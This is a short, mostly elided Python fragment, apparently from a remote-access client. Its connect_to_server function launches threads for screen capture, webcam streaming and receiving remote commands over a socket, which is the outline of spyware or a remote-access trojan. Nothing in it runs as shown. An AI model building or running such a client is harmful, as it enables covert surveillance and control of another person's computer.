...
def connect_to_server():
    ...
    threading.Thread(target=screen_capture, args=(secure_socket,)).start()
    threading.Thread(target=webcam_stream, args=(secure_socket,)).start()
    threading.Thread(target=receive_commands, args=(secure_socket,)).start()
